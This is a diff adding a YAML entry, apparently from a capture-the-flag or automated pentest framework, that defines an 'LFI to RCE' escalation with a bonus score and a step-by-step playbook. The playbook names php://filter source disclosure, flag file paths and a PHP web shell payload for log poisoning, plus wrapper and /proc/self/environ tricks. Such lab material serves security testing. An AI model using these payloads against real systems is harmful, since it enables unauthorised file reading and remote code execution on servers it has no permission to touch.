@@ -1,0 +1,14 @@
+id: lfi_to_rce
+name: LFI -> source disclosure / RCE
+impact: Arbitrary file read (flag) and often RCE via wrappers or log poisoning
+bonus: 6
+requires:
+  - any_of: [php_lfi, path_traversal]
+playbook: |
+  1. Confirm read primitive at the finding location.
+  2. php://filter/convert.base64-encode/resource=index.php  -> read source of other files.
+  3. Read the flag directly: /flag.txt, ../../../flag, /flag.
+  4. RCE escalation (PHP):
+     - Log poisoning: inject <?php system($_GET[c]);?> into an accessible log, then include it.
+     - php://input with allow_url_include, or data:// wrapper.
+     - session file / /proc/self/environ poisoning.
